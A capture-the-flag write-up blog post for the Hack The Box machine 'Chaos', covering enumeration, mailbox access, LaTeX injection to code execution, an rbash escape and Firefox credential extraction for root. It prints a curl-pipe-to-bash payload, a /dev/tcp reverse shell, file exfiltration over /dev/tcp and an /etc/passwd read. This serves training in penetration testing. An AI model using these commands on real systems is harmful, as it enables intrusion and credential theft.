---
layout: post
title:  "Chaos Writeup - Hack The Box"
date:   2023-12-16
desc: "E-mail service Abusing, Cryptology Challenge, LaTeX Injection, Bypassing rbash, Firefox Profile Extracting Credentials"
keywords: "HTB,eJPT,eWPT,Medium,E-mail Service Abuse, Cryptology, LaTeXi, Bypassing rbash, Firefox Profile Extraction"
categories: [HTB]
tags: [HTB,eJPT,eWPT,wpscan,E-mailAbuse,Cryptology,LaTeXi,rbashBypass,FirefoxExtract,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

This [Hack The Box](https://www.hackthebox.com/){:target="_blank"} machine (**Chaos**), was very attractive to me, due to the variety of techniques that I had to use and investigate. I also had to look for help in the search engines, not because of the machine itself, but because of the tools I was using and their installation was faulty in my **Linux**. So it was a nice journey to get everything to work and manage to break this machine that is classified as average, by the hacker community.
<br/><br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos.png" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

I start by deploying the box with **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}** and then with `nmap` I will try to get all the exposed ports on the victim machine, and using their scripts, I can also know the services and their versions. There are protocols and services that are familiar to me, **HTTP POP3 IMAP SSL** but there is also a port with a **MiniServ** service that I don't know at the moment. With the **Apache** Server version I look for the codename in the browser.

```bash
./htbExplorer -d Chaos
```

```bash
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.120 -oG allPorts
nmap -sCV -p80,110,143,993,995,10000 10.10.10.120 -oN

cat targeted
# Apache httpd 2.4.34
# duckduck.go --> Apache 2.4.34 launchpad   Cosmic
```

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I will start by scanning the **SS** certificate with `openssl`, find a **CN**, and add it to my list of hosts, and then with `wfuzz` or `gobuster` try to find subdomains, in case Virutal Hosting is being implemented. With `whatweb` and **Wappalyzer** I find the technologies that are implementing the web service on port **80**, I do not see anything important or maybe something is escaping me.

> The **Common Name (AKA CN)** represents the server name protected by the **SSL** certificate. The certificate is valid only if the request hostname matches the certificate common name. Most web browsers display a warning message when connecting to an address that does not match the common name in the certificate.

```bash
openssl s_client -connect 10.10.10.120:993
openssl s_client -connect 10.10.10.120:995

# Virtual Hosting --> /etc/hosts      chaos.htb

nvim /etc/hosts

whatweb http://chaos.htb
```

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I browse for the website I don't find much, there are some pages in development, in the source code there is no **hard-coded**. If I list the directories or files in the **chaos.htb** domain, I find some directories that have Directory Listing, but it doesn't help me much for the moment, then, if I don't find anything I will go deeper into all these techniques to look for possible attack vectors.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://chaos.htb/FUZZ
```

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I will go deeper into directory enumeration with `wfuzz`, but using the IP instead of the domain, maybe the behavior of the server will be different. Indeed I find a **WordPress** implemented, and with **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** also leake me its version for possible exploits.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.120/FUZZ
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.120/wp/FUZZ
```

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

I can verify that if I enter a valid user and an incorrect password, **WordPress** informs me, I have a possible way to enumerate users, but it is not recommended and not a good practice. Instead with `searchsploit` I know that there is an exploit to get this same information without using brute force, but this website is not vulnerable. I could also exploit `xmlrpc.php` (**[Wordpress xmlrpc.php - common vulnerabilites & how to exploit them](https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32){:target="_blank"}**), but for the moment I'm going to keep enumerating and not try to exploit anything yet.

```bash
searchsploit wordpress user enumeration
# ---> wp-json/wp/v2/users/
```

<br/><br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

If I look at the **WordPress** home page there is a publication, if I try to access it I can not because it requires a password, but I leak me a username, **human**, which in the sign-in panel confirms that it exists in the system, this information does not have much relevance at the moment but perhaps later may serve me.

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I can use **[`wpscan`](https://github.com/wpscanteam/wpscan){:target="_blank"}** to perform a deeper enumeration of **WordPress**, but it only confirms the existence of the `human` user, it is worth clarifying that there are different parameters to configure for the tool to be more effective, if necessary then I will use it again. I see that there is a post of the user, and if I try to guess the password, using some very used or even using the same of the user's name, I am lucky and I confirm that security has not been taken into account and has not followed good practices when it comes to protecting the password. In the post you are leaking credentials for a **Webmail** service.

> **Webmail** (or web-based email) is an email service that can be accessed using a standard web browser. It contrasts with email service accessible through a specialised email client software. Additionally, many internet service providers (ISP) provide webmail as part of their internet service package. Similarly, some web hosting providers also provide webmail as a part of their hosting package.

```bash
gem install wpscan

wpscan --url http://10.10.10.120/wp/wordpress --enumerate u
```

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I try to access the web service on port **10000**, it only allows me with the **domain** name and not using the **IP**, which makes me think about using Virtual Hosting again, something I will keep in mind. The credentials I found previously do not work for me to log-in.

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_29.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

But if I look again at the exposed ports and services, there are others that are also related to mail protocols. I can search in the search engines for programs that can connect me in client mode (**webmail client linux**) to try to access them and their resources. There are many, but I choose **[Claws-mail](https://itsfoss.com/best-email-clients-linux/){:target="_blank"}**, because it was recommended to me in the community, otherwise I could use any other. If I install it and try to get a connection without having well defined configurations I cannot access the service.

> **POP3**: Port 110 is traditionally used for the Post Office Protocol version 3 (POP3), which is a standard protocol for email retrieval. POP3 allows users to access their email messages from a remote server and download them to their local devices.

> An **IMAP server** typically listens on port number 143. IMAP over SSL/TLS (IMAPS) is assigned the port number 993. Virtually all modern e-mail clients and servers support IMAP, which along with the earlier POP3 (Post Office Protocol) are the two most prevalent standard protocols for email retrieval.

```bash
apt install claws-mail
claws-mail
```

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_30.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_31.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_32.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I configure correctly with the server type (IMAP) and the server address, as well as the credentials, now I can access the mail service. It seems that there are no saved mails because all the boxes are set to 0.

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_33.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_34.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_35.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_36.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

However, if I visit each mailbox, I find a mail in received. The user **Ayush** sent an encrypted file and also the script I use to do it, to the user **Sahay**. I download both to analyze them on my machine. The encrypted file, of course, is unreadable, but the script is written in `python`, which allows me to analyze its content.

```bash
cat en.py
```

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_37.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_38.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_39.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_40.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I search in a search engine for a project that implements the **encrypt()** function, I found the **[File-Encryption-Script](https://github.com/vj0shii/File-Encryption-Script/blob/master/decrypt.py){:target="_blank"}** project by **vj0shii**, in which there is the script for encrypting and decrypting. I download the one I am interested in, after correcting some problems with `python`, I find that it works correctly with `python2` and no other, on my machine of course. I can now decrypt the file and read its contents, which is a hidden directory of the web service, with `curl` I test to see if I can access and I have a successful response.

```bash
wget https://raw.githubusercontent.com/vj0shii/File-Encryption-Script/master/decrypt.py

pip uninstall pycryptodome
pip install pycryptodome

python decrypt.py
python3 decrypt.py

python2.7 decrypt.py          # :)

cat im_msg.txt | xclip -sel clip

echo "SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK" | base64 -d; echo

curl -s -X GET http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3
curl -s -X GET http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3 -L
```

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_41.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_42.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_43.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I access the directory, and I find a service that allows me to generate a **PDF** file through a form in which I can enter the text. I make a test but I do not know if it generated successfully, I would have to know if there is a directory where the files are stored as they are created. With `wfuzz` I can enumerate in search of more directories, and I find several but with a 301 code, and if I follow the redirection I find a **pdf** directory, that if I access from the browser I find the files created by me.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/FUZZ
wfuzz -c --hc=404 -L -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/FUZZ
```

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_44.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_45.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_46.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_47.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

But I still don't know what tool it uses to generate the **PDF** file, so I'm going to search in the other directories I found with `wfuzz` previously, and I get a very important information in the **source** folder, it seems that it is implementing **LaTeX**, which could be useful to test injecting malicious code. With `burpsuite`, I capture the data being sent and try some basic injections provided by **[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection){:target="_blank"}**, but they are blacklisted.

> **[LaTeX](https://www.latex-project.org/about/){:target="_blank"}**, which is pronounced «Lah-tech» or «Lay-tech» (to rhyme with «blech» or «Bertolt Brecht»), is a document preparation system for high-quality typesetting. It is most often used for medium-to-large technical or scientific documents but it can be used for almost any form of publishing. LaTeX is not a word processor! Instead, LaTeX encourages authors not to worry too much about the appearance of their documents but to concentrate on getting the right content.

```bash
burpsuite &> /dev/null & disown
```

```json
content=\input{/etc/passwd}&template=test3
```

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_48.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_49.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_50.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_51.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

There are other injections, I just have to try one that works. It won't take long to find a successful answer, I have already achieved an **RCE** through a **LaTeXi**. To get a shell on the victim machine, I create an `index.html` file with the necessary code to send me a **Reverse Shell** and with an injection I just have to execute the command that uses `curl` to load the malicious file and interpret it with `bash`. I managed to access the machine.

```bash
python3 -m http.server 80
```

```json
content=\immediate\write18{whoami}&template=test3
content=\immediate\write18{curl 10.10.14.15}&template=test13
```

```bash
nvim index.html

python3 -m http.server 80
nc -nlvp 443
```

> **index.html**

```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'
```

```json
content=\immediate\write18{curl 10.10.14.15|bash}&template=test13
```

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_52.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_53.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_54.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_55.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_56.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

In order to have a better mobility in the terminal I perform a **Console treatment**, and then I perform a system enumeration with some basic commands. I only find that the `pkexec` binary has **SUID** permissions, which makes it vulnerable to the **[PwnKit exploit](https://github.com/ly4k/PwnKit){:target="_blank"}**, but I'm not going to use it for the moment. I am going to look for another way, as I see that this box has problems when it comes to **managing passwords**, maybe passwords are being reused and so it is, the user **ayush** does not take security very much into account. I perform a user pivoting but I access a **Restricted Bash**.

> **[The Restricted Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html){:target="_blank"}**: If Bash is started with the name rbash, or the --restricted or -r option is supplied at invocation, the shell becomes restricted. A restricted shell is used to set up an environment more controlled than the standard shell.

```bash
whoami
hostname
hostname -I

script /dev/null -c bash        [Ctrl^Z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
stty size

id
groups
cat /etc/crontab

cat /etc/passwd | grep 'sh$'
getcap -r / 2>/dev/null
find \-perm -4000 2>/dev/null
which pkexec | xargs ls -l

su ayush
echo $PATH
```

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_57.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_58.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_59.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_60.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I press **TAB** twice I can access the list of commands that I can execute, there are some binaries that can help me to escape from the `rbash`. In **[GTFObins](https://gtfobins.github.io/gtfobins/tar/#shell){:target="_blank"}**, I find the command for `tar` that allows me to spawn a full shell, but to execute all the commands, I must export my ***PATH***, since the one defined in the victim machine, only contemplates a directory. Once this is done, I try the terminal and I can also access the first flag.

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

echo $PATH
export PATH=....
```

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_61.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_62.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_63.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_64.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_65.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

There is another way to bypass the **restricted bash**, since the `su` command has the '**-**' parameter to obtain a shell similar to the one we perform the authentication to migrate user. Once in the new shell, we change the **PATH**, and again enumerate the system, I find the `pkexec` vulnerability but nothing else. But browsing in the folders, I find one related to **Firefox**, which usually can have information in its database that can be transformed into a possible attack vector.

```bash
man su
# -, -l, --login
# Start the shell as a login shell with an
# environment similar to a real login
```

```bash
su - ayush

export PATH=.......

find \-perm -4000 2>/dev/null
which pkexec | xargs ls -l

getcap -r / 2>/dev/null
id
groups
netstat -nat
ps -faux
```

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_66.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_67.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_68.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_69.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_70.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I try to transfer the **key4.db** file to my machine and if I search the Internet for "**firefox key4.db decrypt github**" I find a repository **[Firepwd.py, an open source tool to decrypt Mozilla protected passwords](https://github.com/lclevy/firepwd){:target="_blank"}**, but I cannot run it on my machine, but I also notice that it needs all the resources contained in the user's profile folder.

> **key4.db**: It's a sensitive file which can be used to get all saved logins, without logging into the OS. It's rare for users to make it safe using Primary Password capability in Firefox Settings. also when Primary Password is set, the performance drops specifically.

> **Victime Machine**:

```bash
nc -nlvp 443 > key4.db
```

> **Attacker Machine**:

```bash
cat < key4.db > /dev/tcp/10.10.14.15/443

git clone https://github.com/lclevy/firepwd
pip install -r requirements.txt

python firepwd.py -h
python3 firepwd.py -h
python2.7 firepwd.py -h
```

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_71.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_72.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I use another tool that I also found on the Web, **[Firefox Decrypt](https://github.com/unode/firefox_decrypt){:target="_blank"}**, I test it and it works correctly with `python`. I will transfer recursively with `wget` all the resources that the script needs, once I have everything I need I can run it and get the credentials of the `root` user. I perform a privilege escalation and manage to rooted the box.

> **Attacker Machine**:

```bash
git clone https://github.com/Unode/firefox_decrypt
python firefox_decrypt.py
```

> **Victime Machine**:

```bash
python3 -m http.server
```

> **Attacker Machine**:

```bash
wget -r 10.10.10.120:8000

python firefox_decrypt.py ./bzo7sjt1.default
# jiujitsu
```

<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_73.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_74.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_75.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/chaos_writeup/Chaos_76.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

> There are machines that I like, because of the complexity when it comes to breaking them. But there are others that may not be so challenging in their difficulty, but have many services and configurations that can confuse and make you get lost or miss something. This machine has several concepts that can help a pentester in his daily task. Always grateful to **Hack The Box** for the excellent labs it has, it's time to use `htbExplorer` and kill the box and move on to another one.

```bash
./htbExplorer -k Chaos
```
